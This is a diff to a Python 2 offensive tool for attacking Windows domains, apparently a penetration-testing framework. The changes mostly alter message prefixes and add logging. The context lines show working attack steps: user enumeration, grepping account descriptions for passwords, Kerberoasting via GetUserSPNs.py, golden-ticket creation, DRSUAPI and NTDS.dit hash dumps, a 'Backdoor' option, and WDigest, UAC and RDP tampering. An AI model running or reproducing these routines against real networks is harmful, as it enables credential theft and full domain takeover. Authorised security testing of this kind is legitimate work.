@@ -309,6 +309,7 @@ def quickjtr(filename):
 def WriteLAT():
 	try:
 		print colored("[+]Attempting to write Local Account Token Filter Policy ",'green')
+		logging.info("[+]Attempting to write Local Account Token Filter Policy ")
 		fout=open('/tmp/lat.bat','w')
 		fout.write('@echo off\n\n')
 		fout.write('cls\n')
@@ -393,7 +394,7 @@ def enumdomusers(ip,username,password,path):
 		if dom_accounts[len(dom_accounts)-1]=='':
 			del dom_accounts[len(dom_accounts)-1]
 
-		print colored('[*]Successfully extracted '+str(len(dom_accounts))+' user name(s)','green')
+		print colored('[+]Successfully extracted '+str(len(dom_accounts))+' user name(s)','green')
 					
 		if os.path.isfile(path+str(targets[0])+"_users.txt"):
 			os.remove(path+str(targets[0])+"_users.txt")
@@ -403,7 +404,7 @@ def enumdomusers(ip,username,password,path):
 			fout.write(u+"\n")
 		fout.close()
 
-		print colored('[*]User accounts written to file '+(path+str(targets[0]))+"_users.txt",'green')
+		print colored('[+]User accounts written to file '+(path+str(targets[0]))+"_users.txt",'green')
 
 	else:
 		print colored('[-]Looks like we were unsuccessfull extracting user names with this method','red')
@@ -417,7 +418,7 @@ def getdescfield(ip,username,password,path):
 	
 	#Start by seeing if out userfile exists, if it does read in contents
 	if os.path.isfile(filename):
-		print colored('[*]Enumerating usernames to get description information...','yellow')
+		print colored('[+]Enumerating usernames to get description information...','yellow')
 		with open(filename,'r') as inifile:
 			data=inifile.read()
 			user_list=data.splitlines()
@@ -425,7 +426,7 @@ def getdescfield(ip,username,password,path):
 		#Make sure that the list of users is greater than 0
 		if len(user_list)>0:
 			#Confirm userfile found and its not empty
-			print colored('[*]Username file found...','green')
+			print colored('[+]Username file found...','green')
 			for x in xrange(0,len(user_list)):
 				if '\\' in user_list[x]:
 					paccount=user_list[x].split("\\", 1)[1]
@@ -452,7 +453,7 @@ def getdescfield(ip,username,password,path):
 								descfield.append(tmpline.replace("Description :	", "").rstrip())
 
 		if len(descfield)>0:
-			print colored('[*]Successfully extracted '+str(len(descfield))+' accounts with descriptions','green')
+			print colored('[+]Successfully extracted '+str(len(descfield))+' accounts with descriptions','green')
 		
 			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
 				os.remove(path+str(ip)+"_desc_users.txt")
@@ -462,21 +463,21 @@ def getdescfield(ip,username,password,path):
 				fout.write(usernames[u]+","+descfield[u]+"\n")
 			fout.close()
 
-			print colored('[*]Accounts with descriptions written to file '+path+str(ip)+"_desc_users.txt",'green')
+			print colored('[+]Accounts with descriptions written to file '+path+str(ip)+"_desc_users.txt",'green')
 			
 			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
 				proc = subprocess.Popen('grep -i pass '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
 				stdout_value = proc.communicate()[0]
 
 				if len(stdout_value)>0:
-					print colored('[*]A quick check for pass reveals... '+'\n','yellow')
+					print colored('[+]A quick check for pass reveals... '+'\n','yellow')
 					print stdout_value+"\n"
 
 				proc = subprocess.Popen('grep -i pwd '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
 				stdout_value = proc.communicate()[0]
 
 				if len(stdout_value)>0:
-					print colored('[*]A quick check for pwd reveals... '+'\n','yellow')
+					print colored('[+]A quick check for pwd reveals... '+'\n','yellow')
 					print stdout_value
 		
 	else:
@@ -1319,9 +1320,9 @@ def hashparse(hashfolder,hashfile):
 				
 				#If we're parsing the drsuapi file it also includes the local hashes which we need to filter out
 				#Domain hashes start after the line below
-				#[*] Using the DRSUAPI method to get NTDS.DIT secrets
+				#[+] Using the DRSUAPI method to get NTDS.DIT secrets
 				for x in xrange(1,len(hash_list)):
-					if hash_list[x]=='[*] Using the DRSUAPI method to get NTDS.DIT secrets':
+					if hash_list[x]=='[+] Using the DRSUAPI method to get NTDS.DIT secrets':
 						hl_st=x
 						break
 					else:
@@ -1757,6 +1758,7 @@ if get_spn in yesanswers or get_spn=="l":
 			print colored("[+]Note - to crack the extracted hashes with JtR, JtR Jumbo Patch is needed",'blue')
 			print colored("[+]which can be cloned from https://github.com/magnumripper/JohnTheRipper.git",'blue')
 			
+			#Check that a domain name has been entered
 			if domain_name==".":
 				print colored("[-]You must enter a domain - e.g. ecorp.local",'red')
 				exit(1)		
@@ -1775,10 +1777,12 @@ if get_spn in yesanswers or get_spn=="l":
 				proc = subprocess.Popen("GetUserSPNs.py "+domain_name+'/'+user+':'+passw+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
 				stdout_value = proc.communicate()[0]
 			
+			#Check output to see whether SPN entries were found
 			if "No entries found!" in stdout_value:
 				print colored("[-]No SPN entries were found!",'red')
 				sys.exit()
 
+			#Confirm that SPN's have been saved properly
 			if not os.path.isfile(outputpath+targets[0]+"/spns.txt"):
 				print colored("[-]No SPNS's were output",'red')
 			else:
@@ -1788,6 +1792,7 @@ if get_spn in yesanswers or get_spn=="l":
 			
 		except OSError:
 			print colored("[-]Something went wrong getting SPN's from DC",'red')
+			logging.error("[-]Something went wrong getting SPN's from DC")
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -1823,6 +1828,7 @@ if wifi_credentials in yesanswers:
 			
 		except OSError:
 			print colored("[-]Something went wrong getting Wifi Details",'red')
+			logging.error("[-]Something went wrong getting Wifi Details")
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -1928,6 +1934,8 @@ if recorddesktop in yesanswers:
 			
 		except OSError:
 			print colored("[-]Something went wrong recording the desktop",'red')
+			logging.error("[-]Something went wrong recording the desktop")
+
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -2016,10 +2024,12 @@ if golden_ticket in yesanswers:
 
 					else:
 						print colored("[-]Something Went Wrong Creating Golden-Ticket...",'red')
+						logging.error("[-]Something went wrong creating Golden-Ticket")
 
 			sys.exit()
 		except OSError:
-			print colored("[-]Something went wrong creating Golden-Ticket",'red')		
+			print colored("[-]Something went wrong creating Golden-Ticket",'red')
+			logging.error("[-]Something went wrong creating Golden-Ticket")		
 			sys.exit()
 
 if password_policy in yesanswers:
@@ -2038,6 +2048,7 @@ if password_policy in yesanswers:
 			
 		except OSError:
 			print colored("[-]Something went wrong checking the password policy",'red')
+			logging.error("[-]Something went wrong checking the password policy")		
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -2113,7 +2124,8 @@ if edq_scforceoption!='n':
 				
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using the SCforceoption...",'red')
+				logging.error("[-]Something went wrong whilst using the SCforceoption")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2155,7 +2167,8 @@ if edq_SingleSessionPerUser!='n':
 				
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using SingleSessionPerUser setting...",'red')
+				logging.error("[-]Something went wrong whilst using SingleSessionPerUser setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2197,7 +2210,8 @@ if edq_allowtgtsessionkey!='n':
 				
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using allowtgtsessionkey setting...",'red')
+				logging.error("[-]Something went wrong whilst using allowtgtsessionkey setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2251,7 +2265,8 @@ if edq_autologon!='n':
 				
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using AutoLogon setting...",'red')
+				logging.error("[-]Something went wrong whilst using AutoLogon setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2308,7 +2323,8 @@ if edq_wdigest!='n':
 				
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using Wdigest setting",'red')
+				logging.error("[-]Something went wrong whilst using Wdigest setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2346,7 +2362,8 @@ if edq_nla!='n':
 				sys.exit()
 
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using NLA setting...",'red')
+				logging.error("[-]Something went wrong whilst using NLA setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2391,7 +2408,8 @@ if edq_trdp!='n':
 
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using the change the RDP Port setting...",'red')
+				logging.error("[-]Something went wrong whilst using the change the RDP Port setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2441,7 +2459,8 @@ if edq_rdp!='n':
 
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using the RDP setting...",'red')
+				logging.error("[-]Something went wrong whilst using the RDP setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2473,7 +2492,8 @@ if edq_backdoor!='n':
 
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using the Backdoor setting...",'red')
+				logging.error("[-]Something went wrong whilst using the Backdoor setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2507,7 +2527,8 @@ if edq_uac!='n':
 
 				sys.exit()	
 		except OSError:
-				print colored("[-]Something went wrong...",'red')
+				print colored("[-]Something went wrong whilst using the UAC setting...",'red')
+				logging.error("[-]Something went wrong whilst using the UAC setting")
 				sys.exit()	
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
@@ -2619,6 +2640,7 @@ if drsuapi in yesanswers:
 		
 		except OSError:
 			print colored("[-]Something went wrong using the drsuapi method",'red')
+			logging.error("[-]Something went wrong using the drsuapi method")
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -2705,6 +2727,7 @@ if ntds_util in yesanswers or ntds_util=="d":
 			sys.exit()		
 		except OSError:
 			print colored("[-]Something went wrong dumping NTDS.dit",'red')
+			logging.error("[-]Something went wrong dumping NTDS.dit")
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
@@ -2794,7 +2817,8 @@ if policiesscripts_dump in yesanswers:
 									if n.find("/add"):
 										print colored(n,'red')
 						except:
-							print "Failed"
+							print colored ("[-]Failed to find items using the command net user",'red')
+							logging.error("[-]Failed to find items using the command net user")
 
 				sys.exit()
 		else:
